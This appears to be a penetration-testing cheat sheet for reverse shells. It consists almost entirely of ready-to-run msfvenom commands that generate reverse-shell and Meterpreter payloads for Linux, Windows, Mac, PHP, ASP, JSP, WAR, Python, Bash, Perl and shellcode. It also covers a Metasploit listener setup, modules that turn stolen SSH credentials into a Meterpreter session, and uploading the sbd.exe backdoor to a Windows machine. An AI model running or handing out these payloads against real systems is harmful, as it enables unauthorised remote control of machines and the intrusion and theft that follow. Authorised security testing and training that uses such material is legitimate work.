# reverse shell

Creating Meterpreter Shells with MSFVenom - http://www.securityunlocked.com/2016/01/02/network-security-pentesting/most-useful-msfvenom-payloads/

 Linux

 \`msfvenom -p linux/x86/meterpreter/reverse\_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f elf &gt; shell.elf\`

 \*Windows\*

 \`msfvenom -p windows/meterpreter/reverse\_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f exe &gt; shell.exe\`

 \*Mac\*

 \`msfvenom -p osx/x86/shell\_reverse\_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f macho &gt; shell.macho\`

 → WEB PAYLOADS

 \*PHP\*

 \`msfvenom -p php/reverse\_php LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.php\`

 OR

 \`msfvenom -p php/meterpreter\_reverse\_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.php\`

 Then we need to add the &lt;?php at the first line of the file so that it will execute as a PHP webpage:

 \`cat shell.php \| pbcopy && echo '&lt;?php ' \| tr -d '\n' &gt; shell.php && pbpaste &gt;&gt; shell.php\`

 \*ASP\*

 \`msfvenom -p windows/meterpreter/reverse\_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f asp &gt; shell.asp\`

 \*JSP\*

 \`msfvenom -p java/jsp\_shell\_reverse\_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.jsp\`

 \*WAR\*

 \`msfvenom -p java/jsp\_shell\_reverse\_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f war &gt; shell.war\`

 \*\*Scripting Payloads\*\*

 \*Python\*

 \`msfvenom -p cmd/unix/reverse\_python LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.py\`

 \*Bash\*

 \`msfvenom -p cmd/unix/reverse\_bash LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.sh\`

 \*Perl\*

 \`msfvenom -p cmd/unix/reverse\_perl LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.pl\`

 \*\*Shellcode\*\*

 For all shellcode see ‘msfvenom –help-formats’ for information as to valid parameters. Msfvenom will output code that is able to be cut and pasted in this language for your exploits.

 \*Linux Based Shellcode\*

 \`msfvenom -p linux/x86/meterpreter/reverse\_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f &lt;language&gt;\`

 \*Windows Based Shellcode\*

 \`msfvenom -p windows/meterpreter/reverse\_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f &lt;language&gt;\`

 \*Mac Based Shellcode\*

 \`msfvenom -p osx/x86/shell\_reverse\_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f &lt;language&gt;\`

 \*\*Handlers\*\*  
 Metasploit handlers can be great at quickly setting up Metasploit to be in a position to receive your incoming shells. Handlers should be in the following format.

 use exploit/multi/handler  
 set PAYLOAD &lt;Payload name&gt;  
 set LHOST &lt;LHOST value&gt;  
 set LPORT &lt;LPORT value&gt;  
 set ExitOnSession false  
 exploit -j -z

 Once the required values are completed the following command will execute your handler – ‘msfconsole -L -r ‘

- SSH to Meterpreter: https://daemonchild.com/2015/08/10/got-ssh-creds-want-meterpreter-try-this/

 use auxiliary/scanner/ssh/ssh\_login  
 use post/multi/manage/shell\_to\_meterpreter

- SBD.exe

 sbd is a Netcat-clone, designed to be portable and offer strong encryption. It runs on Unix-like operating systems and on Microsoft Win32. sbd features AES-CBC-128 + HMAC-SHA1 encryption \(by Christophe Devine\), program execution \(-e option\), choosing source port, continuous reconnection with delay, and some other nice features. sbd supports TCP/IP communication only.  
 sbd.exe \(part of the Kali linux distribution: /usr/share/windows-binaries/backdoors/sbd.exe\) can be uploaded to a windows box as a Netcat alternative.

